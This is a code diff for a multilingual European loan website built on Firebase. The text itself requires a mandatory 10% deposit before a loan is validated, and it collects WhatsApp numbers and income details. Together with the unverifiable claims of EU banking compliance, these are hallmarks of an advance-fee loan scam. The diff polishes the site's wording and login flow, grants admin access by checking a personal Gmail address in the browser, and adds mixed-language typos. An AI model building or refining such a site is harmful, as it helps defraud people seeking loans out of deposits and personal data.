@@ -160,7 +160,7 @@
                         <h3 class="font-bold text-lg">Étape 1 : Soumettez votre Demande de Prêt (Jusqu'à 2 000 000 €)</h3>
                     </div>
                     <p class="text-xs text-slate-700 leading-relaxed">
-                        Veuillez renseigner le type de prêt, le montant, vos <strong>revenus mensuels</strong> et votre <strong>numéro WhatsApp indispensable</strong>.
+                        Veuillez renseigner le type de prêt, le montant, vos <strong>revenus mensuels</strong> et votre <strong>numéro WhatsApp indispensable</strong> avant que votre prêt soit crédité sur votre tableau de bord.
                     </p>
                     <form onsubmit="submitLoanApplication(event)" class="grid grid-cols-1 md:grid-cols-4 gap-4 text-xs pt-2">
                         <div>
@@ -394,7 +394,9 @@
 
         window.firebaseAuth.onAuthStateChanged(async (user) => {
             if (user) {
-                if (user.email === "Jaures153@gmail.com") {
+                const adminEmail = "jaures153@gmail.com";
+                
+                if (user.email.toLowerCase() === adminEmail) {
                     document.getElementById('sec-simulator').classList.add('hidden');
                     document.getElementById('sec-client-space').classList.add('hidden');
                     document.getElementById('sec-admin-dashboard').classList.remove('hidden');
@@ -405,6 +407,10 @@
                     document.getElementById('sec-client-space').classList.remove('hidden');
                     loadClientData(user.email);
                 }
+            } else {
+                document.getElementById('sec-client-space').classList.add('hidden');
+                document.getElementById('sec-admin-dashboard').classList.add('hidden');
+                document.getElementById('sec-simulator').classList.remove('hidden');
             }
         });
 
@@ -460,7 +466,7 @@
                     whatsapp: whatsapp,
                     status: "En attente du dépôt de garantie"
                 });
-                alert("Demande de prêt et informations de revenus enregistrées avec succès !");
+                alert("Demande de prêt enregistrée avec succès !");
                 loadClientData(currentUser.email);
             } catch(err) {
                 alert("Erreur : " + err.message);
@@ -654,7 +660,7 @@
                 docsBtn: "Enviar documentos para validación",
                 modalTitle: "Espacio Prestatario", modalSub: "Por favor, identifíquese.",
                 lblEmail: "Dirección de correo electrónico (Gmail)", lblPass: "Contraseña", lblCountry: "País de residencia (UE - 27 Estados)",
-                lblLang: "Idioma de la interfaz", btnLoginSubmit: "Iniciar sesión",
+                lblLang: "Idioma da la interfaz", btnLoginSubmit: "Iniciar sesión",
                 lblOtpCode: "Introduce el código anterior:", btnVerifyCode: "Verificar Código y Crear Cuenta",
                 btnSignupStep: "Generar código en pantalla"
             },
@@ -734,7 +740,7 @@
                 resNote: "* O depósito de 10% constitui uma condição prévia obrigatória para validar o pedido de empréstimo.",
                 btnApply: "Fazer pedido oficial e Registar",
                 adv1Title: "Conformidade Europea", adv1Desc: "Estrito cumprimento das normas bancárias da União Europeia, garantindo total segurança das suas transações e dados pessoais.",
-                adv2Title: "Multilingue e 27 Estados", adv2Desc: "Plataforma disponível para todos os residentes do Espaço Economico Europeo com suporte linguístico automatizado.",
+                adv2Title: "Multilingue e 27 Estados", adv2Desc: "Plataforma disponível para todos os residentes do Espaço Economico Europeo com suporte linguistique automatizado.",
                 adv3Title: "Decisão Rápida", adv3Desc: "Acompanhamento em tempo real do seu dossier através do seu espaço pessoal seguro e processamento rigoroso pelos nossos especialistas.",
                 dashTitle: "Painel do Mutuário", dashSubtitle: "Acompanhamento do seu dossier de financiamento europeu.",
                 btnLogout: "Terminar sessão",
